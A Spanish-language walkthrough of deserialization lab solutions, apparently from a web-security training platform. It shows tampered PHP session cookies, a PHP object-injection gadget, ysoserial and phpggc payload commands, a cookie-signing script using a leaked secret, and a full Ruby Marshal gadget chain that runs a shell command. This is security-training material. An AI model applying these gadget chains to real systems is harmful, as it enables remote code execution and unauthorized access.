# Insecure Deserialization 

## Lab: Modifying serialized objects

Iniciamos sesión con el usuario normal, identificamos que en la cookie `session` hay un objeto serializado en php codificado en base64: 
```
# base64
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d

# text 
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

Modificamos el valor del booleano del campo `admin` por 1 volvemos a codificar en base64 y utilizamos esa cookie
```
# text
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}

# Base64 cookie
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3d
```

## Lab: Modifying serialized data types

Identificamos que en la cookie de sesion se manera un access_token, aprovechando la manera en la que php maneja el `==` modificamos el valor de dicho access token por 0. 
```  
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}
```

Codificamos en base64 y utilizamos esta nueva cadena como cookie de sesion. 

## Lab: Using application functionality to exploit insecure deserialization

Manejamos una cookie de sesión la cual continue la ruta de donde esta almacenada la imagen del perfil del usuairo. Cuando la cuenta se elimina, el archivo de la imagen tambien se elimina del sistema de ficheros. Ya que el valor de la cookie es un objeto serializado, modificamos la ruta de la imagen por una archivo arbitrario. 
Importante en esta ocación aplicarle path traversal ya que si no no encontrara la ruta del archivo.  
``` se eliminara el archivo arbitrarío que pongamos. 
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"sssjzkpui2zqmb1rtftil026kqhts04z";s:11:"avatar_link";s:40:"../../../../../../home/carlos/morale.txt";}
```
Codificamos en base64 y utilizamos ese valor como cookie, así cuando seleccionemos eliminar la cuenta tambien

## Lab: Arbitrary object injection in PHP
  
Buscamos en el sitemap he encontramos un archivos `php`. Caundo ponemos el caracter `~` al final del nombre del archivo y realizamos la petición, se nos entrega el codigo fuente de dicho archivo: 
```
GET /libs/CustomTemplate.php~
```

Analizando vemos que hay una clase llamada `CustomTemplate` la cual tiene el siguiente magec method interesante: 
```php
    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
```

Luego de revisarlo, tomamos el valor de la cookie de sesion la cual esta serializada y la cambiamos por completo por la data seríalizada de la clase `CustomTemplate` con el archivo que queramos eliminar y lo usamos como valor de cookie de sesion  
```
# Plain text 
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}

# base64
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3d%3d
```

## Lab: Exploiting Java deserialization with Apache Commons

Dado que sabemos que la web maneja la biblioteca de "Apache Commons Collections library" y en su cookie de sesion maneja un valor serializado. Utilizando la herramienta ysoserial generamos un payload que explota un gadget chain para esta libreria: 
Instalación de ysoserial: 
```bash
sudo apt install openjdk-8-jdk maven -y
git clone https://github.com/frohoff/ysoserial
cd ysoserial
mvn clean package -DskipTests
```

Uso para este exploit: 
```
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0
``` 

## Lab: Exploiting PHP deserialization with a pre-built gadget chain

Revisando el código fuente del lado del cliente y el sitemap vemos que el archivo `/cgi-bin/phpinfo.php` esta expuesto en la web. En el identificamos el "secret key" con el que se puede firmar el token. 

Dado que la cookie de sesion maneja la siguiente data que esta URL encodeada la decoficamos: 
```
# URL
Cookie: session=%7B%22token%22%3A%22Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJldHJyMnh0N2tobm4zM2k5bnRqNXNnNGFsODlmZDRncCI7fQ%3D%3D%22%2C%22sig_hmac_sha1%22%3A%228de35f6fd378de610ef0b4e87d65da15055bf89b%22%7D

# Text Plain 
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJldHJyMnh0N2tobm4zM2k5bnRqNXNnNGFsODlmZDRncCI7fQ==","sig_hmac_sha1":"8de35f6fd378de610ef0b4e87d65da15055bf89b"}
``` 

Vemos que el conteniedo del token esta codificado en base64 y es un objeto seríalizado. Adicionalmente cuando generamos un error en la aplicación enviando una cookie malformada obtenemos la versión del framework que se esta utilizando -> `Internal Server Error: Symfony Version: 4.3.6`

Con estos dato y la herramienta `phpggc` podemos generar un exploit
- Primero generamos el objeto serializado aplicable para este caso: 
```
./phpggc symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
```
- Luego firmamos y generamos la cookie con el formato esperado: 
```php
<?php

$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
$secretKey = "sisn6lsgjxrgn7ol6rgwctfeewdmhw7c";


$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');

echo $cookie;

?>
```

## Lab: Exploiting Ruby deserialization using a documented gadget chain

Identificamos que la cookie de sesion es un objeto serializado, ya que sabemos que esta serializado en ruby buscamos en internet algun exploit conocido:
- `https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html` 
Una vez encontrado, modificamos algunas partes del mismo, primero el comando a ejecutar, luego cambiamos las ultimas dos lineas por `puts Base64.encode64(payload)` y antes ponemos `requier "base64"`. 

Este sería el script que tendríamos que ejecutar: 
```ruby
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

require "base64"
payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)
```

Luego convertimos la cadena que nos dio con un formato de base64 valido: 
```bash 
echo "BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06                                           
OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBp
b286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVh
ZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRl
YnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdl
bTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2Rf
aWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxl
LnR4dAY7DFQ7EjoMcmVzb2x2ZQ==" | tr -d "\n\r"
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==
```

